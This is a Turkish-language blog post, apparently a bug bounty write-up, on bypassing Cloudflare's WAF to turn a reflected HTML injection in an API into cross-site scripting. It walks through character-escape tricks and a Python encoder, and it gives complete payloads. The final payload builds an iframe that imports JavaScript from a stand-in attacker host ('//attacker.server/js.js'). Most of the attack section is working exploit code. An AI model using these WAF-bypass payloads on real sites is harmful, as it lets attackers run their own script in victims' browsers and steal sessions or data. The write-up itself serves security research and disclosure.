# [TR] Reflected XSS CloudFlare Bypass

> **Author**: phlmox
> **Published**: Jan 9, 2026

---

![phlmox](https://miro.medium.com/v2/resize:fill:32:32/1*kIjyouTSom-cF_AxoScWYQ.jpeg)

11

1

Share

Herkese merhaba,

Bu yazımda Bug bounty sırasında bulduğum bir RXSS zafiyetini paylaşmak istedim. Hedefe ait API servisini test ederken bir HTTP isteğinin cevabında bir parametrenin yansıdığını ve Content-Type header’ının text/html olduğunu gördüm (API’de alışıldık değil). Bu HTML injection zafiyetini CloudFlare WAF bypasslayarak XSS zafiyetine dönüştürdüm. Fazla uzatmadan rapora geçelim.

Zafiyetin bulunduğu website aslında uygulamanın API’si üzerinde. İstek şu şekilde:

![image](https://miro.medium.com/v2/resize:fit:458/1*akql0Mq8aJk0eryssT9StQ.png)

Bu istek gönderildiğinde cevap olarak şu geliyor:

![image](https://miro.medium.com/v2/resize:fit:700/1*tRXE1H8SmHmvt2a4aJjxGA.png)

Cevapta görebileceğiniz üzere period parametresinde bizden gün sayısı isteniyor. Bu alana ‘a’ olarak verdiğimiz değer sayfada for .. days olarak yansıyor. Geriye verdiğimiz parametre üzerinde bir temizlik işlemi yapılıp yapılmadığını tespit etmek kalıyor.

![image](https://miro.medium.com/v2/resize:fit:286/1*ROrIQWJWETtwGQ2H3uyMPA.png)

‘<h1>asd’ olarak verdiğim girdinin sayfada yansıdığını görüyoruz. Şimdi geriye yalnızca Javascript çalıştırmak kaldı. Basit bir XSS payload’ı denediğimizde Cloudflare tarafından bloklanıyoruz.

![image](https://miro.medium.com/v2/resize:fit:294/1*EJkQmUutETEZMGLIrtx2qw.png)

![image](https://miro.medium.com/v2/resize:fit:620/1*ofhQhqYU4t-6t2fIg-mM1Q.png)

İlk olarak RenwaX23'ün XSS payloadları listesini denedim. Burada farklı durumlar için farklı payload’lar var fakat buradan hiçbir şey işe yarar görünmüyor çünkü Cloudflare `` ve () karakterlerini blokluyor. Bu da doğrudan fonksiyon çalıştırmayı engelliyor. Bu noktada XSS elde etmek için bir diğer şansımız document.body.innerHTML ile sayfaya XSS payload’ımızı inject etmek.

```
document.body.innerHTML='x'
```

Tabii ki bu payload’ı doğrudan kullanmak işe yaramayacak ve Cloudflare WAF bizi bloklayacak. Çünkü Cloudflare this, window, document, body, innerHTML gibi keyword’leri de birlikte kullanıldığı zaman blokluyor.

Ama self keyword’ü bloklanmamış. Bu keyword’ü kullanarak şu şekilde document.body.innerHTML özelliğine erişebiliriz:

![image](https://miro.medium.com/v2/resize:fit:213/1*IWDDmvLVIFOmkOIh3n7qpg.png)

Tabii ki Cloudflare bu sırada uyumuyor. Eğer self[“document”][“body”] ifadesini parametrede kullanırsak bizi blokluyor. Bu durumun çözümü için Javascript’in “Character escape” özelliğini kullanabiliriz: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Character_escape

![image](https://miro.medium.com/v2/resize:fit:597/1*AIyUoaEzqTNKtK1zsUZRmQ.png)

Görülebileceği üzere karakterlerin hex değerleri kullanılarak \xHH, \uHHHH veya \u{HHH} kaçışları kullanılabiliyor. Örneğin ‘A’ (hex=41) karakterini

- \x41
- \u0041
- \u{41}

formatlarında ifade edebiliriz. Burada biraz oyalandıktan sonra şu garip davranışı farkettim:

- Eğer \uHHHH kaçışı kullanılırsa Cloudflare bunu kolaylıkla tespit edip geri çevirebiliyor. Fakat garip bir şekilde \u{HHH} kaçışı kullanılırsa burada bizi bloklamıyor.

![image](https://miro.medium.com/v2/resize:fit:272/1*M_dmllPO63ub1wDQHEPUcQ.png)

İkisi de aynı çıktıyı veriyor fakat 2.si WAF tarafından bloklanmıyor. Bu özelliği kullanmak için basit bir Python fonksiyonu yazdım. 2 escape’i de sırasıyla kullanarak kafasını karıştırmaya çalışıyor. Açıkcası sırası ile kullanımın çok işe yaradığını düşünmüyorum ve muhtemelen yalnızca \u{HH} kaçışı da işe yarayacaktı fakat bunu çoktan yazmış bulundum 😔

```
>>> def enc(txt):
...     for i,c in enumerate(txt):
...             if i%2==0:
...                     print("\\x"+str(hex(ord(c)))[2:],end="")
...             else:
...                     print("\\u{"+str(hex(ord(c)))[2:]+"}",end="")
...     print()
```

Çıktısı ise şu şekilde:

```
>>> enc("document")
\x64\u{6f}\x63\u{75}\x6d\u{65}\x6e\u{74}
>>> enc("body")
\x62\u{6f}\x64\u{79}
>>> enc("innerHTML")
\x69\u{6e}\x6e\u{65}\x72\u{48}\x54\u{4d}\x4c
```

Şu anda aşağıdaki payload ile sayfa üzerinde a nesnesini document.body olarak tanımlayabiliyoruz:

```
<img src=x onerror=a=self["\x64\u{6f}\x63\u{75}\x6d\u{65}\x6e\u{74}"]["\x62\u{6f}\x64\u{79}"]>
```

![image](https://miro.medium.com/v2/resize:fit:257/1*Zkb3OzS3gdnRmtxPh4J8HQ.png)

Fakat şimdi başka bir sıkıntımız var:

- Cloudflare, a[x]=1 şeklindeki ifadeleri yakaladığında isteği direkt blokluyor. Fakat a=1 ifadesi bloklanmıyor. Yani a[“innerHTML”]=”asd” işlemini gerçekleştiremiyoruz.
- Cloudflare ayrıca a.innerHTML ifadesini de blokluyor.

Tam kenara kısılmışken, Javascript tekrar esnekliğiyle yardımımıza koşuyor. Javascript, document.body.inner\u0048TML ifadesini kabul ediyor. Fakat Cloudflare etmiyor, bu ifadeyi gördüğü anda blokluyor. Ama daha önce de Cloudflare’in dikkatinden kaçan \u{HH} escape’ini denediğimizde bir kez daha işimize yaradığını, bloklanmadığımızı görüyoruz.

## Get phlmox’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Daha öncesinde a nesnesini document.body olarak tanımlamıştık. Şimdi yapmamız gereken ise innerHTML ile sayfaya son payload’ı basmak.

```
a.inner\u{48}TML = 'asd'
```

Son testimizi yaptığımızda başarıyla çalıştığını ve body içeriğinin ‘asd’ değeri olduğunu görüyoruz. Alert almak için ise daha önce kullandığımız character escaped string üreten python fonksiyonuna ‘<img src=x onerror=alert()>’ vererek

\x3c\u{69}\x6d\u{67}\x20\u{73}\x72\u{63}\x3d\u{78}\x20\u{6f}\x6e\u{65}\x72\u{72}\x6f\u{72}\x3d\u{61}\x6c\u{65}\x72\u{74}\x28\u{29}\x3e

çıktısını alıyoruz. Son olarak tüm parçaları birleştirdiğimizde elimizde şu oluşuyor:

```
<img src=x onerror=a=self["\x64\u{6f}\x63\u{75}\x6d\u{65}\x6e\u{74}"]["\x62\u{6f}\x64\u{79}"],a.inner\u{48}TML='\x3c\u{69}\x6d\u{67}\x20\u{73}\x72\u{63}\x3d\u{78}\x20\u{6f}\x6e\u{65}\x72\u{72}\x6f\u{72}\x3d\u{61}\x6c\u{65}\x72\u{74}\x28\u{29}\x3e';>
```

Burada yaptığımız şey şu:

- Öncelikle ‘self’ bize sayfada Window.selfözelliğine erişim sağlıyor.
- Self üzerinden sırasıyla önce document, sonrasında body özelliğine erişim sağlıyor ve bu document.body, a isimli değişkende tutuluyor.
- Hemen sonrasında body innerHTML modifiye edilerek XSS payload’ı yerleştiriliyor.

![image](https://miro.medium.com/v2/resize:fit:611/1*tgDA_CWbpTQulCPJ1TJzUg.png)

Ama impact artırmak için daha etkili Javascript kullanmamız lazım. URL’i de şişirmek istemediğimizden, kendi sunucumdan yazdığım Javascript kodunu çekmek için şöyle bir yöntem kullandım:

```
<iframe src=javascript:import('//attacker.server/js.js')>
```

Böylelikle URL’i daha fazla şişirmeden çalışmasını istediğimiz Javascript kodunu saldırgan sunucusundan çekerek çalıştırabiliyoruz.

Son payload:

```
<img src=x onerror=a=self["\x64\u{6f}\x63\u{75}\x6d\u{65}\x6e\u{74}"]["\x62\u{6f}\x64\u{79}"],a.inner\u{48}TML='\x3c\u{69}\x66\u{72}\x61\u{6d}\x65\u{20}\x73\u{72}\x63\u{3d}\x6a\u{61}\x76\u{61}\x73\u{63}\x72\u{69}\x70\u{74}\x3a\u{69}\x6d\u{70}\x6f\u{72}\x74\u{28}\x27\u{2f}\x2f\u{61}\x74\u{74}\x61\u{63}\x6b\u{65}\x72\u{2e}\x73\u{65}\x72\u{76}\x65\u{72}\x2f\u{6a}\x73\u{2e}\x6a\u{73}\x27\u{29}\x3e';>
```

Teşekkürler ❤



---
*Original URL: [https://medium.com/@phlmox/tr-reflected-xss-cloudflare-bypass-a4e9ff9a45cf?source=search_post---------77-----------------------------------](https://medium.com/@phlmox/tr-reflected-xss-cloudflare-bypass-a4e9ff9a45cf?source=search_post---------77-----------------------------------)*
